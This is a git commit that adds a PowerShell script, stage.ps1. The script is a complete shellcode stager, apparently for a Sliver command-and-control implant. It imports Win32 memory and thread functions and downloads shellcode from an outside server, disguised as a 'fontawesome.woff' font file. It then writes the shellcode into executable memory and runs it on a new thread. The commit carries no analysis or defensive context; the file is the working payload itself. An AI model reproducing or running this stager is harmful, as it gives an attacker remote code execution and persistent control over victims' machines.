67a7a35fc7c313a68fe2d2a4a19b3f4dce994fdd
nosfera0x2 <82817752+nosfera0x2@users.noreply.github.com>
2023-10-22 12:02:13 -0700

    Create stage.ps1

---
+++ stage.ps1
@@ -0,0 +1,65 @@
+$Win32 = @"
+
+using System;
+
+using System.Runtime.InteropServices;
+
+public class Win32 {
+
+[DllImport("kernel32")]
+
+public static extern IntPtr VirtualAlloc(IntPtr lpAddress,
+
+    uint dwSize,
+
+    uint flAllocationType,
+
+    uint flProtect);
+
+[DllImport("kernel32", CharSet=CharSet.Ansi)]
+
+public static extern IntPtr CreateThread(
+
+    IntPtr lpThreadAttributes,
+
+    uint dwStackSize,
+
+    IntPtr lpStartAddress,
+
+    IntPtr lpParameter,
+
+    uint dwCreationFlags,
+
+    IntPtr lpThreadId);
+
+[DllImport("kernel32.dll", SetLastError=true)]
+
+public static extern UInt32 WaitForSingleObject(
+
+    IntPtr hHandle,
+
+    UInt32 dwMilliseconds);
+
+}
+
+"@
+
+Add-Type $Win32
+
+
+
+$shellcode = (New-Object System.Net.WebCLient).DownloadData("https://sliver.nosfera0x2.com:443/fontawesome.woff")
+
+if ($shellcode -eq $null) {Exit};
+
+$size = $shellcode.Length
+
+
+
+[IntPtr]$addr = [Win32]::VirtualAlloc(0,$size,0x1000,0x40);
+
+[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size)
+
+$thandle=[Win32]::CreateThread(0,0,$addr,0,0,0);
+
+[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
